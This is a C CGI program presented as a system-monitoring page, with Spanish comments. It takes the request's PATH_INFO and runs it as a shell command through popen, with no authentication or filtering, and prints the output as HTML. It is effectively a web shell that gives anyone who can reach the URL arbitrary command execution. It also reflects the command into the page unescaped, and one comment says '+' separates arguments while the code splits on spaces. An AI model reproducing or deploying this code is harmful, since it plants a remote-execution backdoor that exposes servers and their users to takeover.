#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_CMD_LEN 256

// Función para procesar PATH_INFO y extraer el comando y los argumentos
void parse_path_info(char *path_info, char *cmd, char *args) {
    if (path_info == NULL || path_info[0] == '\0') {
        return;
    }

    // Saltear la primera barra '/'
    path_info++;

    // Separar comando y argumentos usando el separador '+'
    char *token = strsep(&path_info, " ");
    if (token != NULL) {
        strncpy(cmd, token, MAX_CMD_LEN - 1);
    }
    if (path_info != NULL) {
        strncpy(args, path_info, MAX_CMD_LEN - 1);
    }
}

// Función para ejecutar el comando con argumentos
void execute_command(const char *cmd, const char *args) {
    char full_cmd[MAX_CMD_LEN];
    snprintf(full_cmd, sizeof(full_cmd), "%s %s", cmd, args);

    printf("<pre>");
    fflush(stdout);  // Necesario para asegurarse de que la salida de printf se vea inmediatamente.

    // Ejecutar el comando
    FILE *fp = popen(full_cmd, "r");
    if (fp == NULL) {
        printf("Error al ejecutar el comando.\n");
    } else {
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            printf("%s", buffer);
        }
        pclose(fp);
    }
    printf("</pre>");
}

int main() {
    printf("Content-type: text/html\n\n");
    printf("<html><head><title>Monitoreo del Sistema</title></head><body>\n");

    char cmd[MAX_CMD_LEN] = {0};
    char args[MAX_CMD_LEN] = {0};

    // Obtener la información de PATH_INFO
    char *path_info = getenv("PATH_INFO");
    if (path_info != NULL) {
        parse_path_info(path_info, cmd, args);
    }

    // Validar que se haya pasado un comando
    if (strlen(cmd) > 0) {
        printf("<h2>Ejecutando comando: %s %s</h2>\n", cmd, args);
        execute_command(cmd, args);
    } else {
        printf("<h2>Error: No se ha proporcionado un comando.</h2>\n");
    }

    printf("</body></html>\n");
    return 0;
}
